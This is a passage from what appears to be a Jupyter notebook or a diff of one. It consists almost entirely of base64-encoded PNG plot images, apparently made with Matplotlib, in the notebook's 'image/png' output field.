jm74kVek2DqFIp6MK8ez4GDn8JLGtd3EZfKiUiKjksqkg3T3gWFgDNdZMeJpb8ejIeAld\/A7IzS35dJLM8xywLus7WzT80f9VZpZMOEZUaFlWkm0Nf6DuDsmH7WGB+Pc0AzZK0cRCwoT9wcKb29PhzwNF5QHaG5nHu34pKrk6ZJymlUwyXBv4sFZUXl3cAXzcC4k7oO5NSw6Kq0njJN+L7sfKkUd6d26j5e3Ruya7nxu+av2e+056+sgNwcBYQuRQ4ux743B74a4tmXtJlIPFSyeZVXs120RTD6ff1nQmLIiq70u4A\/52Rr73N7wKp\/wLr+8vXZhnHooqoPEo4D\/zyvub+zyM1PVbLWgPLfYDMdP3mVpL+jQL+OVL85e9ckS+X4iqzP73DYq9IcrKBrCf6zkJe89yBbztrXmdyyqk8wxhYVJFu+O26bMt7IciKdBXyZ+uP1a8B370BpPFyAvIrq8VeGbXECwirWTG\/xMQe1ncG5RaLKtJN7rfr6I2aQ1DJt\/SbT2VX2Yvc1NtluMenpMn8v9\/iD6xRAUItb7sv4\/ED4NfxTwf1A5rek\/kewIWf9JdXXg9iAXU2kHhB35mUfZXo\/YpFVWUh15N6+xjNYOm9U+Vpj4qn0hYU\/29VR+B\/Kn1nUTFc2g7c+hO4e1XfmTz12zTNeMK1PYCbkZppmwcDD+OBH4frN7eSpM6pOCdUaGFRRfR85f3q7LG\/Aym8InC5dqsCnFF0KAxY1Ym\/4\/es+\/88vR\/+uuZvZRiX811vzQkVt07J015ONnDjGJD1WJ72ip1HJvDonn5zKCUsqiqavG9GVLAbx4B1PYEFDfWdSfFVou50SYXpncuzHUdmA7fPAme+1186Bbl3vfjLnvwWiAiRL5eydFiypEln\/YbL096hz4FwP+CnEfK0l1dRXo\/qLGBuHSDlX\/nzKGNYVFU0i1voO4Oy78YxfWfw8ipMgZFHThagVgM\/jSx4fmlvc9Zj4OJ24HGyfO2pCykQcjKB29E6fpsvhf2Q9hKHoHZ\/BBxfCMT\/JVs6en++P7oLXD9UcB4lkduzTWZnFm89kcs0f6\/sfOmUZPH3\/pdv42FCmT7rkkVVpVGBejZijwIR0yvH1cYFNBeurOgyHwFz3TVnU53fUkjQCz5U7v+jGeAMaH5X7\/T\/NIc\/dPHgJvD7\/KfLA8C+T4Ct\/poLsb6s9PvAF47A2u4Fzz+1WjNObG4dzSHBUJvCrxeU98NVCODUGs04x7JGziECf3yj38JqqTfwfZ+n14TLKzlOt8NrRTn8lbd3Lu2O5ndbtwbovnyu0urRznoCJJXC5Uru\/wPMrw9841ny6yomFlUV0fFF+s6gZK3rpdnG02v0nUnxPEzQ\/cM+I0Vz4cq717Sny\/FmmXYHWNUZOL325dvSeZ1JwA9vAVd2aU+P\/R14kgxkFfH09NwP2gc3NL20X7lqHi\/xBHZO0oxR0aWN1V2AAzM1y+SK3qD5G\/cHkHhRc3\/fp8DmIbp\/wJ\/9HrgTA1zdp3l864TmQ\/hZyTef3j8yW\/P3284vbv\/iz8CuIM0ZuQX1ggmhKTALmpeZDlz69cXryOvedSAjTbfYR3eK1raWZ57fv88rOOzcJs0H7J1iDrLPTNc8F180pi39ruZvzK78834eASxtpT0t64n2hWYPfq4pmM+uL3qO5zYAORmaEwpKSsbDp78PCyDf\/k84rzlB4MFNTY\/ys8JfB5Z5a66g\/uAm8LkDcE2GXqln5b6OUsvuYUQWVRXBs0+wiOn5Y+T+xhJ7pHjfHLOeALunaLrSAU0b\/50pXnfugxtFX0bf4k5ovmnp8mGf19lnxtzI8a1990fA7TPAzom6L\/OiYvC\/F1w0cN8nwN8RwKZ3nk4TAjod0nreoZe4Pwte5uazh3oVmh6D3OWE0PwvcguAi9sK3sblbTQFYeQS4PKvmv2miz8Waz5wt4\/RLb6o8h5iO7ky\/\/yTqzQF5q\/jn07LztAc1vx5JLBlSNHW9U1L3XsJtvoDN47r3v7zFFb0bBsN3PsbWPpq8X6y6acRmufi\/AYvl9+zhfKCRsAct6eFVe4vMOz+qIBlb2mKraN5C8cS6JX774ymN\/bZoig7E9gbDBxbUPj6V7TTXMpiUVNgVnUgZu8zbf\/\/6\/7sD5qY7CfA+n6yb0J5wKKqIsj77VoXoTYFn12SkQZsGgys7KjbbzXdiSnaegHgz6WaN\/\/v+2gen1yl+Ua+qRiHWP7aUrLXy7q4HVjyKpAg43Voov6\/Vyjfh\/0LyHXo4\/ZZzTdJQPdvvrmHNmL2AJ\/bPe3BKciLCt1nx+rcuw7MsAU2vv385dQ52oWY5P\/3i66Hmq7s1PQY\/DhM8zjrseYLQl6rX9O8RrKfKfTzXo+ooG\/rgOb\/JOdhqoQLmmJOnaN5fDNSuwfo+MKn9wu6zMmhLzV\/o394Om1NN03BU9RxNrm9BGkJui8T\/nr+MYzPjg96kqo5pB9qAxyYVXA76mcK3cz0\/FfW\/9xe+\/Gv41\/83pjb85TxnEPsMXue30ZBcnu2bp3Unq7O1rz35n3+LGys+XWEg3m2\/dxGzYB\/4PnPp9P\/e84+y9Fe9tvOmt7Yk98+fT6p1ZrX9LNf2oDnD6\/YOPDlhyVEhAA7g4q2zLP7IjtT+xIUarXex98Z6XXtVHKu7tN8K+q1WPNN7t9niqg1vsCHMYCVo+ZF9s9hzYdt4nnN\/P91047PSs\/\/u3Kn\/wdc3Qs0HQj4BGq+8TfqA7j4AA6NAaWl5tCDTS3A2FSzTN7fEFSrgRP\/\/+36+kHNtx27BsA\/hwALO6CmJ2BgWPg2Pr6v+dY8Lc\/VteP+BIyUgNMzA\/Yf3NQUcK9NK6CdB4Cpbf7evK3+mr8r2gIOTYAes5\/OS7+v6dEwNAJ2TNBM67kQiI\/WbGPDPkD6PcDSTjMvNzbv2ZmP7gEW1TRvCkpLwMTi\/2ML+MD+Y7H2B8v1A9rzC\/uQBzSH+SA0\/8NVnTTTxhRQ1F34Gaj2ClCjmeawSup\/mqI1ai1g6fj0w3T7WKB5AQWOOid\/j0LmI02vZDV3TTGdd5zQ1X3AhgGF553X1b3AtX35p3\/bGYBCs9+l7Xjm4pAJ55\/ej1yi+XtxG9ApGNj1Yf42dRmflPIvcP5HoFFfzWHL9f0BDz\/N2ChD4xcvr6sVbZ\/e9x4DnFjx\/PiFTYFWI4F6PYAqrtrzQm0Ar\/e091VhYn\/XFHPJcUDbDzQfoLm\/e5lXdibw70nAwAhwagkYmeSPCfcD2n8ImNoAXsM1F\/Cs5g50+AiwddEcusz1+zyg1aiCv3SInKf3v6xRcN45WZr9n5b09HczazQD3H0170PA\/xe+6vy\/A7moOfDGN4Bbe83r9Z9DQC0v7YL\/0i+aw+XOzxzuA4AtQzXzfcY9nbYvWPP8kPLL1Lz3AsDoo0D1egVvB6B5\/672ivaXn+gNmkHz1V4BbGs\/LRoTLwDvbNa8p6YlAr99Blz4seB29wUDfy4HxkcVfoj2wEzN7XnuF3CG6NW9+acVJHrj0y8E9g00\/5Pm7wAxuzWvoX6rAQt7zXu5Okezfc\/mevJbzWdQ0iXAbz5Qtxvw6wea\/1vPBZrnmh4ohND3aRWVR2pqKmxsbJCSkgJra2v5Gg61yT\/N1Fb7xVyYVqMLPmwgt9emaX8T04WJFfDJv5o3v5jdQMPemrNZDn+pHdd9tuaDM\/qZ8QrG5poXWvq9p6cqA0Dzd59+c3fvqjkcVdMLaPY28Or\/n3qsztZ0c7+IZwAQFV74\/KYDNUVW4gXNC3\/72EK21RL45D\/Nm8sM2xev91mN3yr8TVQXeZ8HDfvo1ovVpD+QGg80fAPwKMFLVPRZAZz69sWHFvWl7YSKP47Rygl4ePvp4w9jNIeM4s89\/XBt8Ibm0Ki+tf9I88WuuIefgv\/TjNcsaBhFRdJrMVC7jebndsoy29pPxxxa2AOPdPiJqtfnab5cyEjXz28WVUW0dOlSzJ07FwkJCWjWrBm++eYbtGpVwLeWApRqUVVRNHtHM1CztNRqpemRKWgwcUmzrqnpHaLyxWu45htzZVLfr+BB2xWB33zg1P+ApIv6zqTktRhS8KG\/8q5aXWD8aVmb1PXzm2OqimDz5s0ICgpCSEgIzpw5g2bNmkGlUiEpiT\/uWmJKs6ACNIcy9FFQASyoyqvKdHHKXA9iXxxTXglROQoqAEiQ8VpiZUnes2lLGXuqisDb2xuvvvoqlizRjMtQq9VwdnbG+PHjMXXqi38Ljz1VREREJUsYmUHxWRFOqNABe6pklpmZiaioKPj6+krTDAwM4Ovri8jIyAKXycjIQGpqqtaNiIiISs59Qx3Gw5YQFlU6unv3LnJycuDg4KA13cHBAQkJBVfEYWFhsLGxkW7Ozs4lktuCWgtLpF0iIqLy5sm7+vtZHl5SoQQFBwcjKOjpdThSU1NLpLCaNGIYgGGyt0tERFTe1NTjullU6ah69eowNDREYqL2xQsTExPh6OhY4DJKpRJKpbI00iMiIiI94+E\/HZmYmMDT0xMHDjy96KJarcaBAwfg4+Ojx8yIiIioLGBPVREEBQXB398fXl5eaNWqFRYuXIhHjx5h2DAeeiMiIqrsWFQVwcCBA3Hnzh1Mnz4dCQkJaN68Ofbu3Ztv8DoRERFVPrxOVSkqsetUERERUYnhdaqIiIiIShGLKiIiIiIZsKgiIiIikgGLKiIiIiIZsKgiIiIikgGLKiIiIiIZsKgiIiIikgGLKiIiIiIZsKgiIiIikgF\/pqYU5V68PjU1Vc+ZEBERka5yP7df9CM0LKpK0cOHDwEAzs7Oes6EiIiIiurhw4ewsbEpdD5\/+68UqdVq3L59G1ZWVlAoFLK1m5qaCmdnZ9y6dYu\/KVjCuK9LB\/dz6eB+Lh3cz6WjJPezEAIPHz6Ek5MTDAwKHznFnqpSZGBggFq1apVY+9bW1nzBlhLu69LB\/Vw6uJ9LB\/dz6Sip\/fy8HqpcHKhOREREJAMWVUREREQyYFFVASiVSoSEhECpVOo7lQqP+7p0cD+XDu7n0sH9XDrKwn7mQHUiIiIiGbCnioiIiEgGLKqIiIiIZMCiioiIiEgGLKqIiIiIZMCiqgJYunQpXF1dYWpqCm9vb5w8eVLfKZVZYWFhePXVV2FlZQV7e3v06dMHMTExWjFPnjxBYGAgqlWrBktLS\/Tr1w+JiYlaMXFxcfDz84O5uTns7e0xefJkZGdna8UcPnwYLVu2hFKphLu7O8LDw0t688qs2bNnQ6FQYOLEidI07md5\/Pfff3j33XdRrVo1mJmZoUmTJjh9+rQ0XwiB6dOno0aNGjAzM4Ovry+uXbum1cb9+\/cxePBgWFtbw9bWFu+99x7S0tK0Yv766y+0b98epqamcHZ2xpw5c0pl+8qKnJwcTJs2DW5ubjAzM8Mrr7yCWbNmaf0WHPd10R09ehS9evWCk5MTFAoFtm\/frjW\/NPfp1q1b4eHhAVNTUzRp0gS7d+8u+gYJKtc2bdokTExMxP\/+9z9x8eJFMXLkSGFraysSExP1nVqZpFKpxNq1a8WFCxdEdHS0eP3114WLi4tIS0uTYsaMGSOcnZ3FgQMHxOnTp0Xr1q1FmzZtpPnZ2dmicePGwtfXV5w9e1bs3r1bVK9eXQQHB0sx\/\/zzjzA3NxdBQUHi0qVL4ptvvhGGhoZi7969pbq9ZcHJkyeFq6uraNq0qZgwYYI0nfv55d2\/f1\/Url1bBAQEiBMnToh\/\/vlH7Nu3T\/z9999SzOzZs4WNjY3Yvn27OHfunHjjjTeEm5ubePz4sRTTvXt30axZM\/Hnn3+K33\/\/Xbi7u4tBgwZJ81NSUoSDg4MYPHiwuHDhgti4caMwMzMTK1euLNXt1acvvvhCVKtWTezcuVPExsaKrVu3CktLS7Fo0SIphvu66Hbv3i0+\/fRT8fPPPwsAYtu2bVrzS2ufHj9+XBgaGoo5c+aIS5cuic8++0wYGxuL8+fPF2l7WFSVc61atRKBgYHS45ycHOHk5CTCwsL0mFX5kZSUJACII0eOCCGESE5OFsbGxmLr1q1SzOXLlwUAERkZKYTQvAkYGBiIhIQEKWb58uXC2tpaZGRkCCGEmDJlimjUqJHWugYOHChUKlVJb1KZ8vDhQ1G3bl0REREhOnbsKBVV3M\/y+Pjjj0W7du0Kna9Wq4Wjo6OYO3euNC05OVkolUqxceNGIYQQly5dEgDEqVOnpJg9e\/YIhUIh\/vvvPyGEEMuWLRNVqlSR9nvuuuvXry\/3JpVZfn5+Yvjw4VrT+vbtKwYPHiyE4L6Ww7NFVWnu0wEDBgg\/Pz+tfLy9vcXo0aOLtA08\/FeOZWZmIioqCr6+vtI0AwMD+Pr6IjIyUo+ZlR8pKSkAgKpVqwIAoqKikJWVpbVPPTw84OLiIu3TyMhINGnSBA4ODlKMSqVCamoqLl68KMXkbSM3prL9XwIDA+Hn55dvX3A\/y+PXX3+Fl5cX+vfvD3t7e7Ro0QLffvutND82NhYJCQla+8jGxgbe3t5a+9nW1hZeXl5SjK+vLwwMDHDixAkppkOHDjAxMZFiVCoVYmJi8ODBg5LezDKhTZs2OHDgAK5evQoAOHfuHI4dO4YePXoA4L4uCaW5T+V6L2FRVY7dvXsXOTk5Wh86AODg4ICEhAQ9ZVV+qNVqTJw4EW3btkXjxo0BAAkJCTAxMYGtra1WbN59mpCQUOA+z533vJjU1FQ8fvy4JDanzNm0aRPOnDmDsLCwfPO4n+Xxzz\/\/YPny5ahbty727duHsWPH4oMPPsC6desAPN1Pz3uPSEhIgL29vdZ8IyMjVK1atUj\/i4pu6tSpePvtt+Hh4QFjY2O0aNECEydOxODBgwFwX5eE0tynhcUUdZ8bFSmaqAIJDAzEhQsXcOzYMX2nUuHcunULEyZMQEREBExNTfWdToWlVqvh5eWFL7\/8EgDQokULXLhwAStWrIC\/v7+es6tYtmzZgvXr12PDhg1o1KgRoqOjMXHiRDg5OXFfk4Q9VeVY9erVYWhomO+MqcTERDg6Ouopq\/Jh3Lhx2LlzJw4dOoRatWpJ0x0dHZGZmYnk5GSt+Lz71NHRscB9njvveTHW1tYwMzOTe3PKnKioKCQlJaFly5YwMjKCkZERjhw5gsWLF8PIyAgODg7czzKoUaMGGjZsqDWtQYMGiIuLA\/B0Pz3vPcLR0RFJSUla87Ozs3H\/\/v0i\/S8qusmTJ0u9VU2aNMGQIUMwadIkqSeW+1p+pblPC4sp6j5nUVWOmZiYwNPTEwcOHJCmqdVqHDhwAD4+PnrMrOwSQmDcuHHYtm0bDh48CDc3N635np6eMDY21tqnMTExiIuLk\/apj48Pzp8\/r\/VCjoiIgLW1tfQB5+Pjo9VGbkxl+b906dIF58+fR3R0tHTz8vLC4MGDpfvczy+vbdu2+S4JcvXqVdSuXRsA4ObmBkdHR619lJqaihMnTmjt5+TkZERFRUkxBw8ehFqthre3txRz9OhRZGVlSTERERGoX78+qlSpUmLbV5akp6fDwED7I9PQ0BBqtRoA93VJKM19Ktt7SZGGtVOZs2nTJqFUKkV4eLi4dOmSGDVqlLC1tdU6Y4qeGjt2rLCxsRGHDx8W8fHx0i09PV2KGTNmjHBxcREHDx4Up0+fFj4+PsLHx0ean3uqf7du3UR0dLTYu3evsLOzK\/BU\/8mTJ4vLly+LpUuXVqpT\/QuS9+w\/Ibif5XDy5ElhZGQkvvjiC3Ht2jWxfv16YW5uLn744QcpZvbs2cLW1lb88ssv4q+\/\/hK9e\/cu8JT0Fi1aiBMnTohjx46JunXrap2SnpycLBwcHMSQIUPEhQsXxKZNm4S5uXmFPc2\/IP7+\/qJmzZrSJRV+\/vlnUb16dTFlyhQphvu66B4+fCjOnj0rzp49KwCIr7\/+Wpw9e1bcvHlTCFF6+\/T48ePCyMhIzJs3T1y+fFmEhITwkgqV1TfffCNcXFyEiYmJaNWqlfjzzz\/1nVKZBaDA29q1a6WYx48fi\/fff19UqVJFmJubizfffFPEx8drtXPjxg3Ro0cPYWZmJqpXry4+\/PBDkZWVpRVz6NAh0bx5c2FiYiLq1KmjtY7K6NmiivtZHjt27BCNGzcWSqVSeHh4iFWrVmnNV6vVYtq0acLBwUEolUrRpUsXERMToxVz7949MWjQIGFpaSmsra3FsGHDxMOHD7Vizp07J9q1ayeUSqWoWbOmmD17dolvW1mSmpoqJkyYIFxcXISpqamoU6eO+PTTT7VO0+e+LrpDhw4V+J7s7+8vhCjdfbplyxZRr149YWJiIho1aiR27dpV5O1RCJHncrBEREREVCwcU0VEREQkAxZVRERERDJgUUVEREQkAxZVRERERDJgUUVEREQkAxZVRERERDJgUUVEREQkAxZVRFSmderUCRMnTiwz7VR2rq6uWLhwob7TICqTWFQRUYECAgKgUCigUChgYmICd3d3zJw5E9nZ2fpO7bkOHz4MhUKR78eaf\/75Z8yaNatUcvjpp5\/w2muvoUqVKjAzM0P9+vUxfPhwnD17tlTWL4fw8HDY2trmm37q1CmMGjWq9BMiKgdYVBFRobp37474+Hhcu3YNH374IUJDQzF37lx9p1UsVatWhZWVVYmv5+OPP8bAgQPRvHlz\/Prrr4iJicGGDRtQp04dBAcHl\/j6XyQzM\/Ollrezs4O5ublM2RBVLCyqiKhQSqUSjo6OqF27NsaOHQtfX1\/8+uuvAIAHDx5g6NChqFKlCszNzdGjRw9cu3ZNWja3p2P79u2oW7cuTE1NoVKpcOvWLSkmICAAffr00VrnxIkT0alTp0Jz+v777+Hl5QUrKys4OjrinXfeQVJSEgDgxo0b6Ny5MwCgSpUqUCgUCAgIAJD\/8J+u+e\/btw8NGjSApaWlVGQW5s8\/\/8ScOXPw9ddf4+uvv0b79u3h4uICT09PfPbZZ9izZ49W\/C+\/\/IKWLVvC1NQUderUwYwZM7R6AhUKBVavXo0333wT5ubmqFu3rrT\/c124cAE9evSApaUlHBwcMGTIENy9e1ea36lTJ4wbNw4TJ05E9erVoVKpAABff\/01mjRpAgsLCzg7O+P9999HWloaAE1v37Bhw5CSkiL1VoaGhgLIf\/gvLi4OvXv3hqWlJaytrTFgwAAkJiZK80NDQ9G8eXN8\/\/33cHV1hY2NDd5++208fPiw0P1IVF6xqCIinZmZmUk9HQEBATh9+jR+\/fVXREZGQgiB119\/HVlZWVJ8eno6vvjiC3z33Xc4fvw4kpOT8fbbb79UDllZWZg1axbOnTuH7du348aNG1Lh5OzsjJ9++gkAEBMTg\/j4eCxatKjAdnTNf968efj+++9x9OhRxMXF4aOPPio0t40bN8LS0hLvv\/9+gfMVCoV0\/\/fff8fQoUMxYcIEXLp0CStXrkR4eDi++OILrWVmzJiBAQMG4K+\/\/sLrr7+OwYMH4\/79+wCA5ORkvPbaa2jRogVOnz6NvXv3IjExEQMGDNBqY926dTAxMcHx48exYsUKAICBgQEWL16MixcvYt26dTh48CCmTJkCAGjTpg0WLlwIa2trxMfHIz4+vsDtVqvV6N27N+7fv48jR44gIiIC\/\/zzDwYOHKgVd\/36dWzfvh07d+7Ezp07ceTIEcyePbvQ\/UhUbhX5J5iJqFLw9\/cXvXv3FkJofik+IiJCKJVK8dFHH4mrV68KAOL48eNS\/N27d4WZmZnYsmWLEEKItWvXCgDizz\/\/lGIuX74sAIgTJ07kW0euCRMmiI4dO0qPO3bsKCZMmFBonqdOnRIApF+lz\/3V+wcPHmjF5W2nKPn\/\/fffUszSpUuFg4NDobl0795dNG3aVGva\/PnzhYWFhXRLTk4WQgjRpUsX8eWXX2rFfv\/996JGjRrSYwDis88+kx6npaUJAGLPnj1CCCFmzZolunXrptXGrVu3BAARExMjbXeLFi0KzTnX1q1bRbVq1aTHa9euFTY2NvniateuLRYsWCCEEOK3334ThoaGIi4uTpp\/8eJFAUCcPHlSCCFESEiIMDc3F6mpqVLM5MmThbe39wtzIipv2FNFRIXauXMnLC0tYWpqih49emDgwIEIDQ3F5cuXYWRkBG9vbym2WrVqqF+\/Pi5fvixNMzIywquvvio99vDwgK2trVZMUUVFRaFXr15wcXGBlZUVOnbsCEBzGEpXuuZvbm6OV155RXpco0YN6VCjroYPH47o6GisXLkSjx49ghACAHDu3DnMnDkTlpaW0m3kyJGIj49Henq6tHzTpk2l+xYWFrC2tpZyOHfuHA4dOqTVhoeHBwBN71AuT0\/PfHnt378fXbp0Qc2aNWFlZYUhQ4bg3r17Wut+kcuXL8PZ2RnOzs7StIYNG+b7H7u6umqNZyvOfiQqD4z0nQARlV2dO3fG8uXLYWJiAicnJxgZyfuWYWBgIBUZufIefnvWo0ePoFKpoFKpsH79etjZ2SEuLg4qleqlB2AXxNjYWOuxQqHIl29edevWxbFjx5CVlSUta2trC1tbW\/z7779asWlpaZgxYwb69u2brx1TU9Pn5qBWq6U2evXqha+++ipfGzVq1JDuW1hYaM27ceMGevbsibFjx+KLL75A1apVcezYMbz33nvIzMyUfSD687aBqCJhTxURFcrCwgLu7u5wcXHRKqgaNGiA7OxsnDhxQpp27949xMTEoGHDhtK07OxsnD59WnocExOD5ORkNGjQAIDmTLJnB35HR0cXms+VK1dw7949zJ49G+3bt4eHh0e+Hg8TExMAQE5OTqHt6Jp\/UQ0aNAhpaWlYtmzZC2NbtmyJmJgYuLu757sZGOj21tyyZUtcvHgRrq6u+dp4tpDKKyoqCmq1GvPnz0fr1q1Rr1493L59WyvGxMTkufsQ0OzHW7duaZ18cOnSJSQnJ7\/UfiQqr1hUEVGR1a1bF71798bIkSNx7NgxnDt3Du+++y5q1qyJ3r17S3HGxsYYP348Tpw4gaioKAQEBKB169Zo1aoVAOC1117D6dOn8d133+HatWsICQnBhQsXCl2vi4sLTExM8M033+Cff\/7Br7\/+mu\/aU7Vr14ZCocDOnTtx584d6Yy24uRfVD4+Pvjwww\/x4YcfIigoCMeOHcPNmzfx559\/Ys2aNVAoFFLBNH36dHz33XeYMWMGLl68iMuXL2PTpk347LPPdF5fYGAg7t+\/j0GDBuHUqVO4fv069u3bh2HDhj23IHJ3d0dWVpa0H7\/\/\/ntpAHsuV1dXpKWl4cCBA7h7926BhwV9fX3RpEkTDB48GGfOnMHJkycxdOhQdOzYEV5eXjpvB1FFwaKKiIpl7dq18PT0RM+ePeHj4wMhBHbv3q11qMfc3Bwff\/wx3nnnHbRt2xaWlpbYvHmzNF+lUmHatGmYMmUKXn31VTx8+BBDhw4tdJ12dnYIDw\/H1q1b0bBhQ8yePRvz5s3TiqlZsyZmzJiBqVOnwsHBAePGjSt2\/sUxb948bNiwAWfPnkXPnj1Rt25d9O\/fH2q1GpGRkbC2tpa2fefOnfjtt9\/w6quvonXr1liwYAFq166t87qcnJxw\/Phx5OTkoFu3bmjSpAkmTpwIW1vb5\/Z2NWvWDF9\/\/TW++uorNG7cGOvXr0dYWJhWTJs2bTBmzBgMHDgQdnZ2mDNnTr52FAoFfvnlF1SpUgUdOnSAr68v6tSpo\/U\/JqpMFOJ5AwSIiIopPDwcEydOzHdlcyKiioo9VUREREQyYFFFREREJAMe\/iMiIiKSAXuqiIiIiGTAooqIiIhIBiyqiIiIiGTAooqIiIhIBiyqiIiIiGTAooqIiIhIBiyqiIiIiGTAooqIiIhIBiyqiIiIiGTwfzbERH9YOVnHAAAAAElFTkSuQmCC\",\n+      \"image\/png\": \"iVBORw0KGgoAAAANSUhEUgAAAkQAAAHHCAYAAABeLEexAAAAOXRFWHRTb2Z0d2FyZQBNYXRwbG90bGliIHZlcnNpb24zLjcuMSwgaHR0cHM6Ly9tYXRwbG90bGliLm9yZy\/bCgiHAAAACXBIWXMAAA9hAAAPYQGoP6dpAACjk0lEQVR4nOzdd1wT5x8H8E9YYQmIMkRlOHEPXLgHiorWra1WRess1jqq1dZt1datddVqHVXr+rnqxoGrbsUtLhAHw8USGUnu90dMIGQnl1zG9\/168QJyz909T3K5+95zz+AxDMOAEEIIIcSK2XCdAUIIIYQQrlFARAghhBCrRwERIYQQQqweBUSEEEIIsXoUEBFCCCHE6lFARAghhBCrRwERIYQQQqweBUSEEEIIsXoUEBFCCCHE6lFARCxeQkICeDweNm7cyHVWiJmIjIxEYGAgq9vcuHEjeDweEhISWN0u0c6MGTPA4\/G4zgYxQRQQEbMnudAo+pk0aZLCdQ4fPowZM2YYN6MGdOHCBXTr1g0+Pj7g8\/kIDAzE8OHDkZiYyHXW5MTExMh8Rvb29ihXrhwGDBiAZ8+ecZ09vc2dOxf79u3jOhtyRCIRNm\/ejLZt26JkyZKwt7eHt7c32rVrh7Vr1yI3N5frLLImOzsbM2bMQExMDNdZIWaER3OZEXO3ceNGDBo0CLNmzUJQUJDMsurVq6NWrVrIzc2Fvb09bG1tAQCjRo3CypUrYQmH\/++\/\/47vv\/8e5cqVQ2RkJEqVKoUHDx5g3bp1AMTBX+PGjTnOZYGYmBi0atUKo0ePRv369ZGfn48bN25g7dq1cHV1xZ07d+Dn58dpHiMjIxETE6NTbY6rqyt69uwpVyMpFAqRn58PPp9v9BqKT58+oVu3bjh27BgaN26Mzp07w8fHB+\/fv8eZM2dw+PBhDBw4EOvXrzdqvgzl7du38PLywvTp0+VufAQCAQQCARwdHbnJHDFZdlxngBC2dOjQAfXq1VO4zFJPfhcuXMCYMWPQtGlTHD16FM7OztJlI0eORJMmTdCzZ0\/cu3cPxYsXN1q+Pn78CBcXF5VpmjVrhp49ewIABg0ahEqVKmH06NHYtGkTJk+ebIxsGpWtra00IDe2sWPH4tixY1i6dCm+\/\/57mWXjx4\/H48ePER0dzUneNCEQCCASieDg4KD3tuzs7GBnR5c+Io8emRGLV7QNUWRkJFauXAkAMo9uCqdduHAh1q5di\/Lly4PP56N+\/fq4evWq3LYfPnyInj17wtPTE46OjqhXrx4OHDggkyY\/Px8zZ85ExYoV4ejoiBIlSqBp06YyF6Dk5GQMGjQIZcqUAZ\/PR6lSpdClSxe1NRSzZ88Gj8fDpk2bZIIhAChfvjzmz5+PpKQk\/PHHHwCAhQsXgsfj4fnz53Lbmjx5MhwcHPDhwwfpa5cvX0b79u3h7u4OZ2dntGjRAhcuXJBZT9Im4\/79++jbty+KFy+Opk2bqsy3Iq1btwYAxMfHS19btWoVqlWrBj6fDz8\/P0RFRSEtLU1mvZYtW6J69eq4fv06GjduDCcnJwQFBWHNmjUy6ZS14ZE8wlP3eGXhwoVo3LgxSpQoAScnJ4SEhGD37t0yaXg8Hj5+\/IhNmzZJj6vIyEiV+9emjPfv30erVq3g7OyM0qVLY\/78+SrzDAAvXrzAunXr0L59e7lgSKJixYr49ttvZV4TiURYunQpqlWrBkdHR\/j4+GD48OEyxwcABAYGolOnTjh\/\/jwaNGgAR0dHlCtXDps3b5bbT1paGsaMGYOyZcuCz+ejQoUK+O233yASiaRpCn8Hly5dKv0O3r9\/H3l5eZg2bRpCQkLg7u4OFxcXNGvWDKdPn5ZZ38vLCwAwc+ZM6ecgqSlS1IZIIBBg9uzZ0n0FBgbip59+knuMqE1ZifmhgIhYjPT0dLx9+1bmR5Hhw4ejbdu2AIC\/\/\/5b+lPYtm3bsGDBAgwfPhy\/\/PILEhIS0L17d+Tn50vT3Lt3D40aNcKDBw8wadIkLFq0CC4uLujatSv27t0rTTdjxgzMnDkTrVq1wooVK\/Dzzz\/D398fN27ckKbp0aMH9u7di0GDBmHVqlUYPXo0MjMzVbYBys7OxsmTJ9GsWTO5R4USffr0AZ\/Px8GDBwEAvXv3Bo\/Hw86dO+XS7ty5E+3atZPWJJ06dQrNmzdHRkYGpk+fjrlz5yItLQ2tW7fGlStX5Nbv1asXsrOzMXfuXAwdOlRpvpV5+vQpAKBEiRIAxO9bVFQU\/Pz8sGjRIvTo0QN\/\/PEH2rVrJ\/M5AMCHDx\/QsWNHhISEYP78+ShTpgxGjhyJv\/76S+t8KLNs2TLUqVMHs2bNwty5c2FnZ4devXrh0KFD0jR\/\/\/03+Hw+mjVrJj2uhg8frnSb2paxffv2qFWrFhYtWoTg4GD8+OOPOHLkiMp8HzlyBEKhEF9\/\/bVW5R0+fDgmTJiAJk2aYNmyZRg0aBC2bt2K8PBwubw9efIEPXv2RNu2bbFo0SIUL14ckZGRuHfvnjRNdnY2WrRogS1btmDAgAFYvnw5mjRpgsmTJ2PcuHFy+9+wYQN+\/\/13DBs2DIsWLYKnpycyMjKwbt06tGzZEr\/99htmzJiBN2\/eIDw8HLGxsQAALy8vrF69GgDQrVs36efQvXt3pWUdMmQIpk2bhrp162LJkiVo0aIF5s2bhy+\/\/FIurSZlJWaKIcTMbdiwgQGg8IdhGCY+Pp4BwGzYsEG6TlRUFKPo8JekLVGiBPP+\/Xvp6\/v372cAMP\/++6\/0tTZt2jA1atRgcnJypK+JRCKmcePGTMWKFaWv1apVi4mIiFCa\/w8fPjAAmAULFmhV7tjYWAYA8\/3336tMV7NmTcbT01P6f2hoKBMSEiKT5sqVKwwAZvPmzdJyVKxYkQkPD2dEIpE0XXZ2NhMUFMS0bdtW+tr06dMZAMxXX32lUb5Pnz7NAGD++usv5s2bN8zr16+ZQ4cOMYGBgQyPx2OuXr3KpKamMg4ODky7du0YoVAoXXfFihXSdSVatGjBAGAWLVokfS03N5epXbs24+3tzeTl5TEMU3CcxMfHK8zP6dOnpa8NHDiQCQgIkEmXnZ0t839eXh5TvXp1pnXr1jKvu7i4MAMHDpQrd9H961JGyecjKaOvry\/To0cPuX0VNnbsWAYAExsbK\/N6bm4u8+bNG+nP27dvpcvOnTvHAGC2bt0qs87Ro0flXg8ICGAAMGfPnpW+lpqayvD5fGb8+PHS12bPns24uLgwjx49ktnmpEmTGFtbWyYxMZFhmILvoJubG5OamiqTViAQMLm5uTKvffjwgfHx8WEGDx4sfe3NmzcMAGb69Oly74fkeJWQfI+GDBkik+6HH35gADCnTp3SuqzEPFENEbEYK1euRHR0tMyPrvr06SPT5qZZs2YAIO0F9f79e5w6dQq9e\/dGZmamtEbq3bt3CA8Px+PHj\/Hq1SsAgIeHB+7du4fHjx8r3JeTkxMcHBwQExMj9zhClczMTABAsWLFVKYrVqwYMjIyZMp2\/fp1aY0MAOzYsQN8Ph9dunQBAMTGxuLx48fo27cv3r17Jy3fx48f0aZNG5w9e1bmMQcAjBgxQuO8A8DgwYPh5eUFPz8\/RERESB811atXDydOnEBeXh7GjBkDG5uC09TQoUPh5uYmUysDiNuFFK6JcXBwwPDhw5Gamorr169rlS9lnJycpH9\/+PAB6enpaNasmUxNnza0LaOrq6tMLY+DgwMaNGigtmee5LN3dXWVef3w4cPw8vKS\/g